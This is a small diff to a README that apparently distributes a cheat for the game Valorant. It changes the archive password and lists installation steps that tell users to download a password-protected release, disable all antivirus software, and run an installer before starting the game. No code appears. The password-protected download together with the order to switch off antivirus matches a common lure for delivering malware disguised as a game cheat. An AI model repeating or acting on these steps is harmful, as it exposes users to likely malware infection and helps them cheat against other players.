@@ -15,7 +15,7 @@
 ### STEPS
 ```sh-session
 [1] Download release 
-Password: NewUPDATE
+Password: updated123
 [2] Disable any Antivirus that is active. (Antivirus will block the game cheat from loading properly.)
 [3] Download and Unzip the zip folder into any directory.
 [4] Run Installer BEFORE Opening Valorant
